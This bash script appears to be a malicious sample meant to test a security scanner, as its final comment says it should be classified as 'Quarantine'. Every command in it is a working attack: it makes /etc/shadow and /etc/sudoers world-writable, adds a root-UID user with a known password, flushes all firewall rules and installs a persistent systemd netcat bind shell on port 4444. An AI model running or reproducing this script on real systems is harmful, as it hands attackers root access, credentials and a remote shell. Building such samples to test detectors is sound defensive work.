#!/bin/bash
# This script attempts to modify system permissions in unauthorized ways

echo "Attempting to modify system permissions..."

# Attempt to change permissions on system files
chmod 777 /etc/passwd
chmod 777 /etc/shadow
chmod 777 /etc/sudoers

# Attempt to change ownership of system files
chown nobody:nobody /etc/passwd
chown nobody:nobody /etc/shadow
chown nobody:nobody /etc/sudoers

# Attempt to add a new user with root privileges
useradd -o -u 0 -g 0 -m -d /root2 -s /bin/bash hacker
echo "hacker:password" | chpasswd

# Attempt to modify firewall rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

# Attempt to install a backdoor service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/nc -l -p 4444 -e /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service

echo "System permissions have been modified."

# This file should be classified as "Quarantine" by the scanner
